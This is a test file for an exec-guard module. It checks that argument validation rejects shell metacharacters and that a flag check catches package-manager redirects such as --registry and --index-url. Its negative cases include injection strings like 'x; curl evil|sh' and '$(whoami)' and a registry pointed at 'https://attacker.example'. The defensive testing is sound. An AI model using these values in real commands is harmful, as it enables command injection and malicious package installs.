import { describe, expect, test } from "bun:test";
import { deniedFlag, validateArgv } from "@/tools/exec-guard";

describe("validateArgv", () => {
  test("accepts a plain install argv", () => {
    expect(validateArgv(["bun", "add", "-d", "bun-types"])).toBeUndefined();
  });

  test("rejects shell metacharacters", () => {
    for (const bad of ["x; curl evil|sh", "$(whoami)", "a && b", "`id`", "a > out", "a\nb"]) {
      expect(validateArgv(["bun", "add", bad])).toBeDefined();
    }
  });

  test("rejects a leading tilde", () => {
    expect(validateArgv(["bun", "add", "~/x"])).toBeDefined();
  });

  test("rejects a binary containing a path separator", () => {
    expect(validateArgv(["./evil", "run"])).toBeDefined();
  });

  test("rejects an empty argv and non-string elements", () => {
    expect(validateArgv([])).toBeDefined();
    expect(validateArgv(["bun", 3])).toBeDefined();
    expect(validateArgv("bun add")).toBeDefined();
  });
});

describe("deniedFlag", () => {
  test("catches a registry redirect that a prefix grant would admit", () => {
    expect(deniedFlag(["bun", "add", "x", "--registry", "https://attacker.example"])).toBe("--registry");
  });

  test("catches --index-url, -g and --prefix", () => {
    expect(deniedFlag(["pip", "install", "x", "--index-url", "http://x"])).toBe("--index-url");
    expect(deniedFlag(["npm", "install", "-g", "x"])).toBe("-g");
    expect(deniedFlag(["npm", "install", "--prefix", "/tmp"])).toBe("--prefix");
  });

  test("catches --flag=value form", () => {
    expect(deniedFlag(["bun", "add", "x", "--registry=https://attacker.example"])).toBe("--registry");
  });

  test("allows an ordinary install", () => {
    expect(deniedFlag(["bun", "add", "-d", "bun-types"])).toBeUndefined();
  });
});
